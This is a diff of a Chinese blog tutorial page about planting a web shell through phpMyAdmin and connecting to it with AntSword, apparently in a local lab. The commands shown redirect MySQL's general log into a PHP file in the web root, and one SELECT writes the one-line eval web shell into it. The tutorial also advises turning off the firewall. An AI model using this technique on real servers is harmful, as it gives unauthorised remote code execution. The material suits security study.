@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>使用“pikacu”与蚁剑获取网站目录 | k-onlの狗窝</title>
+    <title>使用“phpadmin”与蚁剑获取网站目录 | k-onlの狗窝</title>
     <meta name="author" content="k-onl" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -142,7 +142,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>使用“pikacu”与蚁剑获取网站目录</h1>
+        <h1>使用“phpadmin”与蚁剑获取网站目录</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -182,11 +182,20 @@
 <ul>
 <li><strong>开启全局日志记录</strong></li>
 </ul>
-<p>输入：<a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/show-variables.html">show</a> <a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/show-variables.html">variables</a> <a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html#operator_like">like</a> ‘%general%’</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like  &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
 <p>OFF表示未打开</p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122190120083.png" alt="image-20231122190120083"></p>
-<p>输入：set global general_log&#x3D;ON  开启全局日志记录</p>
-<p>显示成功后再次输入：<a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/show-variables.html">show</a> <a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/show-variables.html">variables</a> <a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html#operator_like">like</a> ‘%general%’查看全局日志</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=ON  开启全局日志记录</span><br></pre></td></tr></table></figure>
+
+<p>显示成功后再次输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like  &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>看全局日志</p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122190436135.png" alt="image-20231122190436135"></p>
 <p><strong>全局日志已打开</strong></p>
 <ul>
@@ -197,17 +206,23 @@
 <p>当前的日志文件地址</p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122190613147.png" alt="image-20231122190613147"></p>
 <p>将日志文件路径更改为刚刚新建的php文件目录</p>
-<p>输入：set global general_log_file&#x3D;”C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;phpmuma.php”</p>
-<p>“&#x3D;”号后面的是你的新建php文件的路径</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&quot;C:/phpstudy_pro/WWW/phpmuma.php&quot;</span><br><span class="line"></span><br><span class="line">“=”号后面的是你的新建php文件的路径</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122191237938.png" alt="image-20231122191237938"></p>
-<p>成功执行后再次输入：<a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/show-variables.html">show</a> <a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/show-variables.html">variables</a> <a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html#operator_like">like</a> ‘%general%’查看全局日志询看是否修改成功</p>
+<p>成功执行后再次输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like  &#x27;%general%&#x27;</span><br><span class="line">查看全局日志询看是否修改成功</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122191412808.png" alt="image-20231122191412808"></p>
 <ol start="6">
 <li>在phpmuma文件里写入phpinfo</li>
 </ol>
 <p>关闭防火墙和合安全防护</p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122191851150.png" alt="image-20231122191851150"></p>
-<p>在输入 SELECT “<? phpinfo(); ?>“ 命令 在phpmuma文件里写入phpinfo</p>
+<p>再输入 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;? phpinfo(); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p> 命令 在phpmuma文件里写入phpinfo</p>
 <p>在phpmuma文件里看到这些</p>
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122192109565.png" alt="image-20231122192109565"></p>
 <p>打开浏览器访问phpmuma文件</p>
@@ -216,7 +231,9 @@
 <ol start="7">
 <li>使用“cmd”木马与蚁剑获取网站目录</li>
 </ol>
-<p>在phpMyAdmin里输入SELECT” <?php @eval($_POST[cmd]);?>“命令</p>
+<p>在phpMyAdmin里输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT&quot; &lt;?php @eval($_POST[cmd]);?&gt;&quot;命令</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231122192747259.png" alt="image-20231122192747259"></p>
 <ul>
 <li>下载蚁剑并配置</li>
